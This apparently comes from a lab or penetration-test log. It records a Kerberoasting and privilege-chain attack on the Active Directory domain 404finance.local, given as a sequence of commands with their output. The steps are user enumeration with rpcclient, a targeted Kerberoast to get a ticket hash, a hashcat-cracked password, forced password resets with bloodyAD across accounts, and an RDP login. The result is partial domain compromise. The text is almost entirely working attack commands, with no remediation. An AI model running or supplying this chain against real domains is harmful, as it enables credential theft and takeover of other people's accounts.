# 404finance AD Kerberoast Privilege Chain

## Step 1 — Valid Credentials

Command:
rpcclient -U '404finance.local\karl.hackermann%Password123!!' 10.1.24.29

Output:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[karl.hackermann] rid:[0x44f]
user:[tom.reboot] rid:[0x450]
user:[robert.graef] rid:[0x451]
user:[jan.tresor] rid:[0x453]
user:[svc.services] rid:[0x458]

---

## Step 2 — Targeted Kerberoast

Command:
targetedKerberoast.py -d '404finance.local' -u 'karl.hackermann' -p 'Password123!!' --dc-ip 10.1.24.29

Output:
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (tom.reboot)
$krb5tgs$23$*tom.reboot$404FINANCE.LOCAL$404finance.local/tom.reboot*...

---

## Step 3 — Hash Cracked

Command:
hashcat -m 13100 tom.hash --show

Output:
tom.reboot:P@ssw0rd123

---

## Step 4 — Password Reset Chain

Command:
bloodyAD --host 10.1.24.29 -d 404finance.local -u 'tom.reboot' -p 'P@ssw0rd123' set password 'robert.graef' 'Winter2026!'

Output:
[+] Password changed successfully!

Command:
bloodyAD --host 10.1.24.29 -d 404finance.local -u 'robert.graef' -p 'Winter2026!' set password 'jan.tresor' 'Winter2026!'

Output:
[+] Password changed successfully!

---

## Step 5 — RDP Access

Command:
xfreerdp3 /u:jan.tresor /d:404finance.local /p:'Winter2026!' /v:10.1.24.29 /cert:ignore

Output:
FreeRDP connected successfully

---

## Result

Partial domain compromise achieved:
karl.hackermann → tom.reboot → robert.graef → jan.tresor

Administrative escalation not completed.
